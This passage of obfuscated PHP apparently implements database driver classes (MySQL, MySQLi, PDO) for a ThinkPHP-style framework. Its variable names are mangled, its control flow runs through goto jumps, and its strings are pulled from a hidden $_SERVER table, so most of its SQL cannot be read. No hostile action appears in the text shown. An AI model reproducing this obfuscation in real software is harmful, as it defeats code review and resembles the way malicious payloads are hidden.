$this->config = $e‘ÕáÌèÑÖ; if (empty($this->config[$D‚‚Œ•‘´Õ[13]])) { $this->config[$D‚‚Œ•‘´Õ[13]] = $D‚‚Œ•‘´Õ[33]; } } } public function connect($bì ‡ëÍè = '', $FÅœÉ·Ûè = 0, $C¢ˆù±ì³¡ = false) { $d§•¬Œ†­ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->linkID[$FÅœÉ·Ûè])) { goto aÆ‡Ìßƒ”¾; Bƒ‡éí‚Àğ: mysql_query($d§•¬Œ†­[805] . think_config($d§•¬Œ†­[806]) . $d§•¬Œ†­[55], $this->linkID[$FÅœÉ·Ûè]); if ($aÎù±‡Æê½ > $d§•¬Œ†­[807]) { mysql_query($d§•¬Œ†­[808], $this->linkID[$FÅœÉ·Ûè]); } $this->connected = !0; goto a™²ÈïŠá; aÆ‡Ìßƒ”¾: if (empty($bì ‡ëÍè)) { $bì ‡ëÍè = $this->config; } $c×£ÃóÔŞ… = $bì ‡ëÍè[$d§•¬Œ†­[801]] . ($bì ‡ëÍè[$d§•¬Œ†­[802]] ? "\72{$bì ‡ëÍè[$d§•¬Œ†­[802]]}" : $d§•¬Œ†­[33]); $bƒç‚†Ç… = !empty($bì ‡ëÍè[$d§•¬Œ†­[13]][$d§•¬Œ†­[14]]) ? $bì ‡ëÍè[$d§•¬Œ†­[13]][$d§•¬Œ†­[14]] : $this->pconnect; goto dã‚™çô›“; dã‚™çô›“: if ($bƒç‚†Ç…) { $this->linkID[$FÅœÉ·Ûè] = mysql_pconnect($c×£ÃóÔŞ…, $bì ‡ëÍè[$d§•¬Œ†­[803]], $bì ‡ëÍè[$d§•¬Œ†­[804]], 131072); } else { $this->linkID[$FÅœÉ·Ûè] = mysql_connect($c×£ÃóÔŞ…, $bì ‡ëÍè[$d§•¬Œ†­[803]], $bì ‡ëÍè[$d§•¬Œ†­[804]], !0, 131072); } if (!$this->linkID[$FÅœÉ·Ûè] || !empty($bì ‡ëÍè[$d§•¬Œ†­[17]]) && !mysql_select_db($bì ‡ëÍè[$d§•¬Œ†­[17]], $this->linkID[$FÅœÉ·Ûè])) { think_exception(mysql_error()); } $aÎù±‡Æê½ = mysql_get_server_info($this->linkID[$FÅœÉ·Ûè]); goto Bƒ‡éí‚Àğ; a™²ÈïŠá: if (1 != think_config($d§•¬Œ†­[18])) { unset($this->config); } goto bôŠÈñîÃ†; bôŠÈñîÃ†: } return $this->linkID[$FÅœÉ·Ûè]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($F´ƒ—‰Å‹) { goto eØÑ¤½º; C‡ã˜œ½³¸: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto FùÆËõîµ­; b¦‰‡•È‘: think_action_status($BèãÈ«ˆ†Ò[19], 1); think_status($BèãÈ«ˆ†Ò[20]); $this->queryID = mysql_query($F´ƒ—‰Å‹, $this->_linkID); goto C‡ã˜œ½³¸; AëùËÀÛ½: if (!$this->_linkID) { return !1; } $this->queryStr = $F´ƒ—‰Å‹; if ($this->queryID) { $this->free(); } goto b¦‰‡•È‘; eØÑ¤½º: $BèãÈ«ˆ†Ò =& $_SERVER[Äº¡•ô™Ÿ]; if (0 === stripos($F´ƒ—‰Å‹, $BèãÈ«ˆ†Ò[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto AëùËÀÛ½; FùÆËõîµ­: } public function execute($Aì‘Î˜µÕ­) { goto BÖ‘çéËŒÖ; cÎëƒŒô‘ò: if (!1 === $a’µÛîä’ê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto d£‘îñ†¶Ä; c¶‡–¤´ÅÙ: think_status($Aå¥¹„ÆÕÈ[20]); $a’µÛîä’ê = mysql_query($Aì‘Î˜µÕ­, $this->_linkID); $this->debug(); goto cÎëƒŒô‘ò; BÖ‘çéËŒÖ: $Aå¥¹„ÆÕÈ =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f†éØô¶¦‘; f†éØô¶¦‘: $this->queryStr = $Aì‘Î˜µÕ­; if ($this->queryID) { $this->free(); } think_action_status($Aå¥¹„ÆÕÈ[21], 1); goto c¶‡–¤´ÅÙ; d£‘îñ†¶Ä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Äº¡•ô™Ÿ][809], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B™ø™äª²ø = mysql_query($_SERVER[Äº¡•ô™Ÿ][810], $this->_linkID); $this->transTimes = 0; if (!$B™ø™äª²ø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bÍ–ë‘Î«ª = mysql_query($_SERVER[Äº¡•ô™Ÿ][811], $this->_linkID); $this->transTimes = 0; if (!$bÍ–ë‘Î«ª) { $this->error(); return !1; } } return !0; } private function getAll() { $EˆÛ¾¿ï° = array(); if ($this->numRows > 0) { while ($AÊ«°±Àîå = mysql_fetch_assoc($this->queryID)) { $EˆÛ¾¿ï°[] = $AÊ«°±Àîå; } mysql_data_seek($this->queryID, 0); } return $EˆÛ¾¿ï°; } public function getFields($b­Šë«¢×™) { $eŸğÒßÑŠ =& $_SERVER[Äº¡•ô™Ÿ]; $B©æê¶Õ© = $this->query($eŸğÒßÑŠ[812] . $this->parseKey($b­Šë«¢×™)); $E³™ãŸåØ† = array(); if ($B©æê¶Õ©) { foreach ($B©æê¶Õ© as $C¬í†³Ë¿ => $CÒ£¸‘ÙóŠ) { $E³™ãŸåØ†[$CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[27]]] = array($eŸğÒßÑŠ[28] => $CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[27]], $eŸğÒßÑŠ[29] => $CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[30]], $eŸğÒßÑŠ[31] => (bool) (strtoupper($CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[32]]) === $eŸğÒßÑŠ[813]), $eŸğÒßÑŠ[34] => $CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[35]], $eŸğÒßÑŠ[36] => strtolower($CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[37]]) == $eŸğÒßÑŠ[38], $eŸğÒßÑŠ[39] => strtolower($CÒ£¸‘ÙóŠ[$eŸğÒßÑŠ[40]]) == $eŸğÒßÑŠ[41]); } } return $E³™ãŸåØ†; } public function getTables($a³Â‹áˆİ¸ = '') { $eì•åßÊ½‚ =& $_SERVER[Äº¡•ô™Ÿ]; if (!empty($a³Â‹áˆİ¸)) { $fê¡Û¨“†± = $eì•åßÊ½‚[814] . $a³Â‹áˆİ¸; } else { $fê¡Û¨“†± = $eì•åßÊ½‚[815]; } $FáĞŒ“ŸğË = $this->query($fê¡Û¨“†±); $fæíƒ¨±ˆ = array(); foreach ($FáĞŒ“ŸğË as $E²’Œø’¼ò => $EÀËäé”Ã) { $fæíƒ¨±ˆ[$E²’Œø’¼ò] = current($EÀËäé”Ã); } return $fæíƒ¨±ˆ; } public function replace($a´âÕÇÙÒ, $Cµ¢±Üšá = array()) { $F¾ÍÔå¨”ã =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($a´âÕÇÙÒ as $F¹“šÈ¨ => $E¼‹âç¶ÁŠ) { $Cøìè”™ = $this->parseValue($E¼‹âç¶ÁŠ); if (is_scalar($Cøìè”™)) { $a×‰¤Í·[] = $Cøìè”™; $Dñ±°äÔ[] = $this->parseKey($F¹“šÈ¨); } } $e½Á™ÙŒ² = $F¾ÍÔå¨”ã[816] . $this->parseTable($Cµ¢±Üšá[$F¾ÍÔå¨”ã[264]]) . $F¾ÍÔå¨”ã[817] . implode($F¾ÍÔå¨”ã[47], $Dñ±°äÔ) . $F¾ÍÔå¨”ã[818] . implode($F¾ÍÔå¨”ã[47], $a×‰¤Í·) . $F¾ÍÔå¨”ã[819]; return $this->execute($e½Á™ÙŒ²); } public function insertAll($bÔùºõ‹Ä¨, $CÇĞ«÷æÖ = array(), $cøèê‡¦Ø = false) { goto B¦¢£Ø‹“Ü; E¦…Àççë‰: $B¾êˆŞ¾é = ($cøèê‡¦Ø ? $eø‹ì†±¼ø[821] : $eø‹ì†±¼ø[822]) . $eø‹ì†±¼ø[823] . $this->parseTable($CÇĞ«÷æÖ[$eø‹ì†±¼ø[264]]) . $eø‹ì†±¼ø[817] . implode($eø‹ì†±¼ø[47], $F›‹óÕÉ™Š) . $eø‹ì†±¼ø[824] . implode($eø‹ì†±¼ø[47], $a‰¡ŸœƒÂŞ); return $this->execute($B¾êˆŞ¾é); goto e¥°ˆÕõÚ…; B¦¢£Ø‹“Ü: $eø‹ì†±¼ø =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_array($bÔùºõ‹Ä¨[0])) { return !1; } $F›‹óÕÉ™Š = array_keys($bÔùºõ‹Ä¨[0]); goto cê©å”öÈ; cê©å”öÈ: $a‰¡ŸœƒÂŞ = array(); foreach ($bÔùºõ‹Ä¨ as $bÉŒÄÜÜÄé) { $B…à¯‘†İÙ = array(); foreach ($bÉŒÄÜÜÄé as $bå›…Ğ´Æ‘ => $CÈ¿ó÷‡Øê) { $CÈ¿ó÷‡Øê = $this->parseValue($CÈ¿ó÷‡Øê); if (is_scalar($CÈ¿ó÷‡Øê)) { $B…à¯‘†İÙ[] = $CÈ¿ó÷‡Øê; } } $a‰¡ŸœƒÂŞ[] = $eø‹ì†±¼ø[245] . implode($eø‹ì†±¼ø[47], $B…à¯‘†İÙ) . $eø‹ì†±¼ø[819]; } array_walk($F›‹óÕÉ™Š, array($this, $eø‹ì†±¼ø[820])); goto E¦…Àççë‰; e¥°ˆÕõÚ…: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $D¯ÛÔ‹ï·Ó =& $_SERVER[Äº¡•ô™Ÿ]; $this->error = mysql_errno() . $D¯ÛÔ‹ï·Ó[4] . mysql_error($this->_linkID); if ($D¯ÛÔ‹ï·Ó[33] != $this->queryStr) { $this->error .= LNG($D¯ÛÔ‹ï·Ó[45]) . $this->queryStr; } think_trace($this->error, $D¯ÛÔ‹ï·Ó[33], $D¯ÛÔ‹ï·Ó[46]); return $this->error; } public function escapeString($E½À”ó¦°‡) { if ($this->_linkID) { return mysql_real_escape_string($E½À”ó¦°‡, $this->_linkID); } else { return mysql_escape_string($E½À”ó¦°‡); } } public function parseKey(&$bÊá…­, $Cà¶æ¸Šè = true) { $A¾†Ë¯§šŞ =& $_SERVER[Äº¡•ô™Ÿ]; if ($Cà¶æ¸Šè) { $bÊá…­ = $this->parseKeyCheck($bÊá…­); } if ($bÊá…­ != $A¾†Ë¯§šŞ[173] && !preg_match($A¾†Ë¯§šŞ[825], $bÊá…­)) { $bÊá…­ = $A¾†Ë¯§šŞ[826] . trim($bÊá…­, $A¾†Ë¯§šŞ[826]) . $A¾†Ë¯§šŞ[826]; } return $bÊá…­; } } class DbMysqli extends Db { public function __construct($c¶»Èìù£× = '') { $Cè„ç…ÁÏÃ =& $_SERVER[Äº¡•ô™Ÿ]; if (!extension_loaded($Cè„ç…ÁÏÃ[730])) { think_exception(think_lang($Cè„ç…ÁÏÃ[10]) . $Cè„ç…ÁÏÃ[827]); } if (!empty($c¶»Èìù£×)) { $this->config = $c¶»Èìù£×; if (empty($this->config[$Cè„ç…ÁÏÃ[13]])) { $this->config[$Cè„ç…ÁÏÃ[13]] = $Cè„ç…ÁÏÃ[33]; } } } public function connect($A‹§¾š‘È¼ = '', $Eë÷µ’íÌİ = 0) { $c‡‚‘³®»Ì =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->linkID[$Eë÷µ’íÌİ])) { goto aÆİõå; a†•°á¢‡: $bĞàÓº•Î = $this->linkID[$Eë÷µ’íÌİ]->server_version; $this->linkID[$Eë÷µ’íÌİ]->query($c‡‚‘³®»Ì[805] . think_config($c‡‚‘³®»Ì[806]) . $c‡‚‘³®»Ì[55]); if ($bĞàÓº•Î > $c‡‚‘³®»Ì[807]) { $this->linkID[$Eë÷µ’íÌİ]->query($c‡‚‘³®»Ì[808]); } goto Bå¿Èƒã¾‹; aÆİõå: if (empty($A‹§¾š‘È¼)) { $A‹§¾š‘È¼ = $this->config; } $this->linkID[$Eë÷µ’íÌİ] = new mysqli($A‹§¾š‘È¼[$c‡‚‘³®»Ì[801]], $A‹§¾š‘È¼[$c‡‚‘³®»Ì[803]], $A‹§¾š‘È¼[$c‡‚‘³®»Ì[804]], $A‹§¾š‘È¼[$c‡‚‘³®»Ì[17]], $A‹§¾š‘È¼[$c‡‚‘³®»Ì[802]] ? intval($A‹§¾š‘È¼[$c‡‚‘³®»Ì[802]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto a†•°á¢‡; Bå¿Èƒã¾‹: $this->connected = !0; if (1 != think_config($c‡‚‘³®»Ì[18])) { unset($this->config); } goto dÒæ‰; dÒæ‰: } return $this->linkID[$Eë÷µ’íÌİ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($fğ¾ÌÃùÊ‹) { goto FÓ¨óßá²®; fÃ”Ë˜ƒ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto cÚ·äÁÁà; BíË¶ê Œ®: think_status($D¸›¬Ë‘ª[20]); $this->queryID = $this->_linkID->query($fğ¾ÌÃùÊ‹); if ($this->_linkID->more_results()) { while (($Fô¡İßÌ¾ù = $this->_linkID->next_result()) != NULL) { $Fô¡İßÌ¾ù->free_result(); } } goto fÃ”Ë˜ƒ; FµÙ¹ñêš: $this->queryStr = $fğ¾ÌÃùÊ‹; if ($this->queryID) { $this->free(); } think_action_status($D¸›¬Ë‘ª[19], 1); goto BíË¶ê Œ®; FÓ¨óßá²®: $D¸›¬Ë‘ª =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto FµÙ¹ñêš; cÚ·äÁÁà: } public function execute($A•³åé•Ûë) { goto E‹ÜŞ½œ‡; DÈ•ô„Ó“: $this->queryStr = $A•³åé•Ûë; if ($this->queryID) { $this->free(); } think_action_status($a±¤ïÉ…çë[21], 1); goto A«‰•ùê´·; A²Í–îĞğ: if (!1 === $F¼†¯—„ŸÔ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto a† òéÅ¡; E‹ÜŞ½œ‡: $a±¤ïÉ…çë =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto DÈ•ô„Ó“; A«‰•ùê´·: think_status($a±¤ïÉ…çë[20]); $F¼†¯—„ŸÔ = $this->_linkID->query($A•³åé•Ûë); $this->debug(); goto A²Í–îĞğ; a† òéÅ¡: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $f’Ü ­êŒÉ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$f’Ü ­êŒÉ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aë‡èğ¦ï¹ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Aë‡èğ¦ï¹) { $this->error(); return !1; } } return !0; } private function getAll() { $D¹„³÷‰‡ = array(); if ($this->numRows > 0) { for ($dÃ˜Ù£†Š® = 0; $dÃ˜Ù£†Š® < $this->numRows; $dÃ˜Ù£†Š®++) { $D¹„³÷‰‡[$dÃ˜Ù£†Š®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $D¹„³÷‰‡; } public function getFields($déŞĞ³•¾¶) { $DËùš´Ú±ì =& $_SERVER[Äº¡•ô™Ÿ]; $f¼È°ÖĞšˆ = $this->query($DËùš´Ú±ì[812] . $this->parseKey($déŞĞ³•¾¶)); $bˆë „ó´‰ = array(); if ($f¼È°ÖĞšˆ) { foreach ($f¼È°ÖĞšˆ as $EôÏŠ¦Î½ => $Aµ­ö£Ê) { $bˆë „ó´‰[$Aµ­ö£Ê[$DËùš´Ú±ì[27]]] = array($DËùš´Ú±ì[28] => $Aµ­ö£Ê[$DËùš´Ú±ì[27]], $DËùš´Ú±ì[29] => $Aµ­ö£Ê[$DËùš´Ú±ì[30]], $DËùš´Ú±ì[31] => (bool) ($Aµ­ö£Ê[$DËùš´Ú±ì[32]] === $DËùš´Ú±ì[33]), $DËùš´Ú±ì[34] => $Aµ­ö£Ê[$DËùš´Ú±ì[35]], $DËùš´Ú±ì[36] => strtolower($Aµ­ö£Ê[$DËùš´Ú±ì[37]]) == $DËùš´Ú±ì[38], $DËùš´Ú±ì[39] => strtolower($Aµ­ö£Ê[$DËùš´Ú±ì[40]]) == $DËùš´Ú±ì[41]); } } return $bˆë „ó´‰; } public function getTables($F§Õ‡ß“ŸÌ = '') { $fèºˆŞ®°â =& $_SERVER[Äº¡•ô™Ÿ]; $BŸÄšÇ•¼ = !empty($F§Õ‡ß“ŸÌ) ? $fèºˆŞ®°â[814] . $F§Õ‡ß“ŸÌ : $fèºˆŞ®°â[815]; $C–ôŒçë×È = $this->query($BŸÄšÇ•¼); $EÒÊÓî¤È‰ = array(); if ($C–ôŒçë×È) { foreach ($C–ôŒçë×È as $c„“ù™Ü† => $DšÖŠŒßØ†) { $EÒÊÓî¤È‰[$c„“ù™Ü†] = current($DšÖŠŒßØ†); } } return $EÒÊÓî¤È‰; } public function replace($aˆ‘Æœ¥†™, $b¶’¨ˆæõ’ = array()) { $B‹âùìÑê =& $_SERVER[Äº¡•ô™Ÿ]; foreach ($aˆ‘Æœ¥†™ as $CĞ²Ê¦›« => $bšÄ‹àù§Ù) { $ağ–—Âõà = $this->parseValue($bšÄ‹àù§Ù); if (is_scalar($ağ–—Âõà)) { $EÈÉ÷Ú¨’[] = $ağ–—Âõà; $E†³ÖËæØ[] = $this->parseKey($CĞ²Ê¦›«); } } $B°§ëš»®Š = $B‹âùìÑê[816] . $this->parseTable($b¶’¨ˆæõ’[$B‹âùìÑê[264]]) . $B‹âùìÑê[817] . implode($B‹âùìÑê[47], $E†³ÖËæØ) . $B‹âùìÑê[818] . implode($B‹âùìÑê[47], $EÈÉ÷Ú¨’) . $B‹âùìÑê[819]; return $this->execute($B°§ëš»®Š); } public function insertAll($e÷¨±Ê˜, $cåß•èƒéİ = array(), $e‹‹“ªÄï¼ = false) { goto cÇŠŠè£ŞÇ; cÇŠŠè£ŞÇ: $bÏ“‚„¹” =& $_SERVER[Äº¡•ô™Ÿ]; if (!is_array($e÷¨±Ê˜[0])) { return !1; } $dÁ¼¡›§‚Ù = array_keys($e÷¨±Ê˜[0]); goto f­œ°Ùš„; c¸ÊØ›à³: $Bê¾ÆÜ´ = ($e‹‹“ªÄï¼ ? $bÏ“‚„¹”[821] : $bÏ“‚„¹”[822]) . $bÏ“‚„¹”[823] . $this->parseTable($cåß•èƒéİ[$bÏ“‚„¹”[264]]) . $bÏ“‚„¹”[817] . implode($bÏ“‚„¹”[47], $dÁ¼¡›§‚Ù) . $bÏ“‚„¹”[824] . implode($bÏ“‚„¹”[47], $CùĞ¬è÷£); return $this->execute($Bê¾ÆÜ´); goto aÄÃ·º»³; f­œ°Ùš„: $CùĞ¬è÷£ = array(); foreach ($e÷¨±Ê˜ as $bÌÒØ„ßÓ÷) { $f¤ˆíÑ¡Å× = array(); foreach ($bÌÒØ„ßÓ÷ as $E‘İ‘‹œ‰† => $e£Ã¿¤Ñ–Ó) { $e£Ã¿¤Ñ–Ó = $this->parseValue($e£Ã¿¤Ñ–Ó); if (is_scalar($e£Ã¿¤Ñ–Ó)) { $f¤ˆíÑ¡Å×[] = $e£Ã¿¤Ñ–Ó; } } $CùĞ¬è÷£[] = $bÏ“‚„¹”[245] . implode($bÏ“‚„¹”[47], $f¤ˆíÑ¡Å×) . $bÏ“‚„¹”[819]; } array_walk($dÁ¼¡›§‚Ù, array($this, $bÏ“‚„¹”[820])); goto c¸ÊØ›à³; aÄÃ·º»³: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $aâ…õğËŸ =& $_SERVER[Äº¡•ô™Ÿ]; $this->error = $this->_linkID->errno . $aâ…õğËŸ[4] . $this->_linkID->error; if ($aâ…õğËŸ[33] != $this->queryStr) { $this->error .= LNG($aâ…õğËŸ[45]) . $this->queryStr; } think_trace($this->error, $aâ…õğËŸ[33], $aâ…õğËŸ[46]); return $this->error; } public function escapeString($E’ë‚Ü™¼â) { if ($this->_linkID) { return $this->_linkID->real_escape_string($E’ë‚Ü™¼â); } else { return addslashes($E’ë‚Ü™¼â); } } public function parseKey(&$BÛ²ãÈÜ‘º, $E×Ò›ä¸Õ = true) { $e¹ÈÊÉèƒÁ =& $_SERVER[Äº¡•ô™Ÿ]; if ($E×Ò›ä¸Õ) { $BÛ²ãÈÜ‘º = $this->parseKeyCheck($BÛ²ãÈÜ‘º); } if ($BÛ²ãÈÜ‘º != $e¹ÈÊÉèƒÁ[173] && !preg_match($e¹ÈÊÉèƒÁ[825], $BÛ²ãÈÜ‘º)) { $BÛ²ãÈÜ‘º = $e¹ÈÊÉèƒÁ[826] . trim($BÛ²ãÈÜ‘º, $e¹ÈÊÉèƒÁ[826]) . $e¹ÈÊÉèƒÁ[826]; } return $BÛ²ãÈÜ‘º; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($båø¬ãÑ¿ = '') { $b®‹ôÌÒŸ =& $_SERVER[Äº¡•ô™Ÿ]; if (!class_exists($b®‹ôÌÒŸ[828])) { think_exception(think_lang($b®‹ôÌÒŸ[10]) . $b®‹ôÌÒŸ[829]); } if (!empty($båø¬ãÑ¿)) { $this->config = $båø¬ãÑ¿; if (empty($this->config[$b®‹ôÌÒŸ[13]])) { $this->config[$b®‹ôÌÒŸ[13]] = array(); } } } public function connect($AìŒ…ƒ³Ç = '', $f’«¿Š£ä = 0) { $B›Šè°öŠ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->linkID[$f’«¿Š£ä])) { goto BŠ ÑÆ ÁŞ; BŠ ÑÆ ÁŞ: if (empty($AìŒ…ƒ³Ç)) { $AìŒ…ƒ³Ç = $this->config; } if ($this->pconnect) { $AìŒ…ƒ³Ç[$B›Šè°öŠ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$f’«¿Š£ä] = new PDO($AìŒ…ƒ³Ç[$B›Šè°öŠ[830]], $AìŒ…ƒ³Ç[$B›Šè°öŠ[803]], $AìŒ…ƒ³Ç[$B›Šè°öŠ[804]], $AìŒ…ƒ³Ç[$B›Šè°öŠ[13]]); } catch (PDOException $bÛˆ”âœ²Â) { think_exception($bÛˆ”âœ²Â->getMessage()); } goto AƒÈ×Á¤Ÿ; e‘¥ì•±Âõ: $this->linkID[$f’«¿Š£ä]->exec($B›Šè°öŠ[839] . think_config($B›Šè°öŠ[806])); $this->connected = !0; if (1 != think_config($B›Šè°öŠ[18])) { unset($this->config); } goto d¾¸æ‡‚Œ×; AƒÈ×Á¤Ÿ: $this->dbType = $this->_getDsnType($AìŒ…ƒ³Ç[$B›Šè°öŠ[830]]); if (in_array($this->dbType, array($B›Šè°öŠ[831], $B›Šè°öŠ[832], $B›Šè°öŠ[833], $B›Šè°öŠ[834]))) { think_exception($B›Šè°öŠ[835] . $this->dbType . $B›Šè°öŠ[836] . $this->dbType . $B›Šè°öŠ[837]); } if (!$this->linkID[$f’«¿Š£ä]) { think_exception($B›Šè°öŠ[838]); } goto e‘¥ì•±Âõ; d¾¸æ‡‚Œ×: } return $this->linkID[$f’«¿Š£ä]; } public function free() { $this->PDOStatement = null; } public function query($DòçİÍƒ™°, $C¥¥‡„ò× = array()) { goto aÖ£ù£–¹˜; Cîáé»˜—: think_action_status($då¨Õ×É¬Ä[19], 1); think_status($då¨Õ×É¬Ä[20]); $this->PDOStatement = $this->_linkID->prepare($DòçİÍƒ™°); goto D‡ĞĞ¶Ê‘æ; AÈ—×ªÉâ: if (!1 === $d…‘ÄÉ·£±) { $this->error(); return !1; } else { return $this->getAll(); } goto B†É‘â¯İî; D‡ĞĞ¶Ê‘æ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d…‘ÄÉ·£± = $this->PDOStatement->execute($C¥¥‡„ò×); $this->debug(); goto AÈ—×ªÉâ; CØºí—Ç“: $this->queryStr = $DòçİÍƒ™°; if (!empty($C¥¥‡„ò×)) { $this->queryStr .= $då¨Õ×É¬Ä[840] . print_r($C¥¥‡„ò×, !0) . $då¨Õ×É¬Ä[841]; } if (!empty($this->PDOStatement)) { $this->free(); } goto Cîáé»˜—; aÖ£ù£–¹˜: $då¨Õ×É¬Ä =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CØºí—Ç“; B†É‘â¯İî: } public function execute($Bé ±…è¹³, $A‘øæ£“İí = array()) { goto EÕº‘¨ê‘ë; EÕº‘¨ê‘ë: $aâ¤§¹»‹— =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d±äß£äï; d¨¥Œ‘ËÈ: $E™‡ŸÔˆˆ† = $this->PDOStatement->execute($A‘øæ£“İí); $this->debug(); if (!1 === $E™‡ŸÔˆˆ†) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($CêˆÕˆŠÃª || preg_match($aâ¤§¹»‹—[846], $Bé ±…è¹³)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto cÙÏåš÷‡; d±äß£äï: $this->queryStr = $Bé ±…è¹³; if (!empty($A‘øæ£“İí)) { $this->queryStr .= $aâ¤§¹»‹—[840] . print_r($A‘øæ£“İí, !0) . $aâ¤§¹»‹—[841]; } $CêˆÕˆŠÃª = !1; goto DÎø°ƒÈˆ; FÈ’“¶÷ƒ³: think_status($aâ¤§¹»‹—[20]); $this->PDOStatement = $this->_linkID->prepare($Bé ±…è¹³); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto d¨¥Œ‘ËÈ; DÎø°ƒÈˆ: if ($this->dbType == $aâ¤§¹»‹—[834]) { if (preg_match($aâ¤§¹»‹—[842], $this->queryStr, $Fƒ£Ñóéç)) { $this->table = think_config($aâ¤§¹»‹—[843]) . str_ireplace(think_config($aâ¤§¹»‹—[844]), $aâ¤§¹»‹—[358], $Fƒ£Ñóéç[2]); $CêˆÕˆŠÃª = (bool) $this->query($aâ¤§¹»‹—[845] . strtoupper($this->table) . $aâ¤§¹»‹—[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($aâ¤§¹»‹—[21], 1); goto FÈ’“¶÷ƒ³; cÙÏåš÷‡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d„‰‹ÛÀ¶å = $this->_linkID->commit(); $this->transTimes = 0; if (!$d„‰‹ÛÀ¶å) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $dù‘ˆíÜš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$dù‘ˆíÜš) { $this->error(); return !1; } } return !0; } private function getAll() { $c â‡À†´„ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c â‡À†´„); return $c â‡À†´„; } public function getFields($bºƒÉŒƒ¹š) { goto DàëŒÀ•¶È; DàëŒÀ•¶È: $Aæµ¸—ÉÄÒ =& $_SERVER[Äº¡•ô™Ÿ]; $this->initConnect(!0); if (think_config($Aæµ¸—ÉÄÒ[847])) { $Aùˆä×Úœ = str_replace($Aæµ¸—ÉÄÒ[848], $bºƒÉŒƒ¹š, think_config($Aæµ¸—ÉÄÒ[847])); } else { switch ($this->dbType) { case $Aæµ¸—ÉÄÒ[831]: case $Aæµ¸—ÉÄÒ[849]: $Aùˆä×Úœ = "\x53\105\x4c\x45\103\124\40\40\x20\143\x6f\154\165\155\x6e\137\x6e\x61\x6d\x65\x20\x61\x73\x20\x27\116\x61\x6d\145\x27\x2c\x20\x20\x20\144\141\164\141\137\x74\171\x70\145\x20\x61\163\40\x27\x54\x79\x70\145\47\x2c\x20\x20\x20\x63\157\x6c\165\x6d\156\137\144\x65\x66\x61\165\x6c\x74\40\141\x73\40\x27\104\x65\x66\141\165\154\164\x27\54\x20\x20\40\151\x73\x5f\x6e\165\x6c\154\x61\x62\x6c\x65\40\141\x73\40\x27\116\x75\154\154\x27\12\11\x9\106\x52\117\x4d\x9\151\156\146\x6f\162\x6d\141\164\x69\x6f\x6e\137\163\143\150\x65\x6d\x61\x2e\164\141\142\x6c\x65\x73\40\101\123\x20\164\xa\11\11\x4a\117\x49\116\x9\151\156\x66\x6f\x72\x6d\141\164\x69\157\x6e\137\x73\143\x68\145\155\x61\x2e\x63\x6f\154\x75\155\x6e\x73\x20\x41\x53\40\x63\12\11\x9\x4f\116\40\40\164\56\x74\x61\x62\154\x65\137\x63\141\164\x61\154\157\147\40\x3d\40\x63\56\164\x61\x62\x6c\x65\x5f\143\x61\164\141\154\x6f\147\xa\x9\11\x41\x4e\104\40\x74\56\x74\x61\x62\x6c\x65\x5f\163\x63\150\x65\155\141\x20\75\40\x63\56\164\x61\142\154\x65\x5f\163\143\150\145\x6d\141\12\x9\x9\101\116\104\40\